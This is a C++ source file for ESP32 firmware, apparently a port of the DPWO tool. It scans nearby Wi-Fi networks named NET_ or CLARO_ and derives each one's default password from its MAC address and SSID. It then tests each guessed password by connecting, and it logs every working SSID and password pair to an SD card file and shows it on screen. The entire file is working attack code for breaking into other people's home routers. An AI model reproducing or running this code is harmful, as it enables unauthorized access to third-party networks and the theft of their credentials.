/*
  Port of DPWO for ESP32 by pr3y

  Originally from https://github.com/caioluders/DPWO

  saves login creds on SD mounted card
*/

#include <WiFi.h>
#include <regex>

#define SD_CREDS_PATH "/dpwoCreds.txt"

int apScanned = 0;

void parseBSSID(char* bssidWithoutColon, const char* bssid) {
  int j = 0;
  for (int i = 0; i < strlen(bssid); ++i) {
    if (bssid[i] != ':') {
      bssidWithoutColon[j++] = bssid[i];
    }
  }
  bssidWithoutColon[j] = '\0'; 
}

void netAp(int i) {
  char bssidWithoutColon[18]; 
  parseBSSID(bssidWithoutColon, WiFi.BSSIDstr(i).c_str());
  Serial.println("MAC addr");
  Serial.println(bssidWithoutColon);
  
  char *bssidReady = bssidWithoutColon + 4; 
  bssidReady[strlen(bssidReady)-2] = '\0';
  int ssidLength = WiFi.SSID(i).length();
  if (ssidLength >= 2) {
      String lastTwo = WiFi.SSID(i).substring(ssidLength - 2);
      strcat(bssidReady, lastTwo.c_str());
  } else {
      Serial.println("ERROR");
  }
  WiFi.begin(WiFi.SSID(i).c_str(), bssidReady);
  // TODO: Dont depend on delays and compare the wifi status other way :P
  delay(2000);
  while (WiFi.status() != WL_CONNECTED) {
    Serial.println("\nNOPE");    
    WiFi.disconnect();
    return;
  }
  Serial.println("\nWiFi Connected");
  WiFi.disconnect();
  #if defined(SDCARD)
  appendToFile(SD, SD_CREDS_PATH, String(WiFi.SSID(i) + ":" + bssidReady).c_str());
  Serial.println("\nWrote creds to SD");
  #endif
  DISP.setTextSize(TINY_TEXT);
  DISP.setTextColor(GREEN, BGCOLOR);
  DISP.println(String(WiFi.SSID(i) + ":" + bssidReady).c_str());
}

void claroAp(int i) {
  char bssidWithoutColon[18]; 
  parseBSSID(bssidWithoutColon, WiFi.BSSIDstr(i).c_str());
  Serial.println("MAC addr");
  Serial.println(bssidWithoutColon);
  
  char *bssidReady = bssidWithoutColon + 4; 
  bssidReady[strlen(bssidReady)-2] = '\0';
  int ssidLength = WiFi.SSID(i).length();
  WiFi.begin(WiFi.SSID(i).c_str(), bssidReady);
  delay(2000);
  while (WiFi.status() != WL_CONNECTED) {
    Serial.println("\nNOPE");    
    WiFi.disconnect();
    return;
  }
  Serial.println("\nWiFi Connected");
  WiFi.disconnect();
  #if defined(SDCARD)
  appendToFile(SD, SD_CREDS_PATH, String(WiFi.SSID(i) + ":" + bssidReady).c_str());
  Serial.println("\nWrote creds to SD");
  #endif
  DISP.setTextSize(TINY_TEXT);
  DISP.setTextColor(GREEN, BGCOLOR);
  DISP.println(String(WiFi.SSID(i) + ":" + bssidReady).c_str());
}


void dpwoSetup() {
  Serial.println("Scanning for DPWO...");
  WiFi.mode(WIFI_STA);
  apScanned = WiFi.scanNetworks();
  Serial.println(apScanned);


  DISP.setTextColor(FGCOLOR, BGCOLOR);

}

void dpwoLoop(){
  if (apScanned == 0) {
    DISP.println("no networks found");
  } else {

    //TODO: Add different functions to match Copel and Vivo regex on SSID also
    std::regex netRegex("NET_.*");
    std::regex claroRegex("CLARO_.*");


    //TODO: dont repeat the wifi connection process inside each function, instead work on this loop

    for (int i = 0; i < apScanned; ++i) {
      if (std::regex_search(WiFi.SSID(i).c_str(), netRegex)) {
        netAp(i);
        Serial.println("NET SSID");
      } else if (std::regex_search(WiFi.SSID(i).c_str(), claroRegex)) {
        claroAp(i);
        Serial.println(WiFi.SSID(i));
        Serial.println("CLARO SSID");
      
      } else {
        Serial.println("not vuln");
        Serial.println(WiFi.SSID(i));

      }


    }


  }
  Serial.println("scanning again");
  apScanned = WiFi.scanNetworks();

  //TODO: append vulnerable APs and dont repeat the output
  DISP.println("======");

}



